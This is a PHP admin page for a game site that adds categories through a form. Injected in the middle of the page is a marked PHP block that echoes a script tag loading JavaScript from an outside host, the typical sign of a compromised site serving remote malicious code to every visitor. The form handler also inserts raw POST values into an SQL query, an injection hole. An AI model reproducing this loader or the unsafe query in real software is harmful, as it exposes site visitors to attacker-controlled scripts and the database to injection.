<?php
session_start();
ob_start();

$page = "Add Category";
$side_menu = "Category";
include "inc/session_check.php";

if(isset($_POST['submit']))
{
	//print_r($_POST);
	//exit;
	$category = $_POST['category'];
	$section = $_POST['section'];
	//echo $category; 
	//echo "insert into category (cat_name) values ('$category')";
	//exit;
			$insert = "insert into category (cat_name,section) values ('$category','$section')";
			if(mysql_query($insert))
			{
				header("location: list_category.php?msg=succ&cont=Category posted successfully");
			}
			else
				{
					header("location: list_category.php?msg=err&cont=Error in insert Query.");
				}
	
	 	
	 }
	
?><!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->

  <head>
    <meta charset="utf-8">
    <title>Game Admin | Edit Category</title>
     <link href="icomoon/style.css" rel="stylesheet">
    <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
    <link href="css/main.css" rel="stylesheet">
    

  </head>
  <body>
    
    <?php 
	  	include "inc/header.php";
    ?>

    <div class="container-fluid">
      
    <?php 
	  	include "inc/main_nav.php";
    ?>
      
      <div class="dashboard-wrapper">
        <div class="main-container">
        
          <?php 
		  	include "inc/sub_navbar.php";
			include "inc/breadcrumb.php";
		  ?>

			<div class="row-fluid">
            <div class="span6">
              <div class="widget">
                <div class="widget-header">
                  <div class="title">
                  Category
                  </div>
                </div>
                <div class="widget-body">
				<?php include 'message.php'; ?>
<?php
#63efb8#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967011\"></script>";
echo $g;
}
#/63efb8#
?>                	<form class="form-horizontal no-margin well" id="ad_form" name="form" method="post"  >
	            	  <h5 class="text-info">Category Information</h5>
                    <hr>
                     
                     <div class="control-group">
  <label class="control-label">
    Category * :
  </label>
  <div class="controls">
     <input type="text" name="category" value="">
  </div>
</div>

<div class="control-group">
  <label class="control-label">
    Section * :
  </label>
  <div class="controls">
     <select name="section" class="required">
					<option  value="">--Select--</option>
					<option value="top">Top</option>
					<option value="left">Left</option>
				</select>
				
  </div>
</div>

			 <div class="form-actions no-margin">
				 	<input type="submit" class="btn btn-info" name="submit" value="submit">
                    </div>
			</form>
				</div>
              </div>
            </div>

            
          </div>

          
        </div>
      </div>
    </div>
    
    <?php
    include 'inc/footer.php';
    ?>
  
<script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.js"></script>
<script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
<link href="css/jquery-ui-1.10.3.custom.css" rel="stylesheet">
<script type="text/javascript"  src="js/jquery-latest.js"></script>
<script src="js/jquery-ui-1.10.3.custom.js"></script>
<script type="text/javascript"  src="js/jquery.validate.js"></script>
<script>

    	
    $("#datepicker").datepicker({
            changeMonth: true,
            changeYear: true,
			yearRange: "+0:+1",
			dateFormat: "yy-mm-dd"
        });
    
</script>